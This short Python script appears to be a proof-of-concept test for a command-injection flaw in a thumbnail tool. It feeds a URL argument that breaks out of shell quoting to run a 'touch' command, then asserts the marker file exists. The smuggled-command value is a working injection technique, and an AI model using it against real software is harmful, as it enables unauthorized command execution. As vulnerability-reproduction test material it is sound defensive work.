import os,shlex
from pathlib import Path
import subprocess
root=Path(__file__).resolve().parent
curl=root/'fake-bin/curl'
curl.parent.mkdir(parents=True,exist_ok=True)
curl.write_text('#!/bin/sh\nexit 0\n')
curl.chmod(0o755)
marker=root/'thumbnail-shell-marker'
marker.unlink(missing_ok=True)
payload=f"https://example.invalid/x'; touch {shlex.quote(str(marker))}; #"
env=dict(os.environ,PATH=str(root/'fake-bin')+':/usr/bin:/bin',XDG_CACHE_HOME=str(root/'thumb-home'))
result=subprocess.run([str(root/'thumb_probe'),payload],env=env,capture_output=True,timeout=10)
print('probe_exit:',result.returncode)
print('thumbnail_metadata_executed_shell:',marker.exists())
assert marker.exists()
